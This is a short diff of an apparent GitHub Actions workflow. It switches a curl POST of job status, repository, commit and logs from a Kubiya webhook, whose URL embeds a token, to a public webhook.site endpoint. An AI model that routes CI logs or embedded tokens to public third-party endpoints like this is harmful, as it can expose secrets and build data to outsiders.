@@ -93,4 +93,4 @@ jobs:
                     '{status: $status, repository: $repo, workflow: $workflow, commit: $commit, logs: $logs}')
         curl -X POST -H "Content-Type: application/json" \
         -d "$PAYLOAD" \
-        https://webhooksource-kubiya.hooks.kubiya.ai:8443/SJ0nTf217EIcfL2UkJQIgnYC4dKpODJcnD6I1Nt13Ck-Gik-exdNnSt_hBLTNDCtyAFESZglemI10-4kAOI=
+        https://webhook.site/96d81943-7709-43c7-83d5-7049f7f4464c
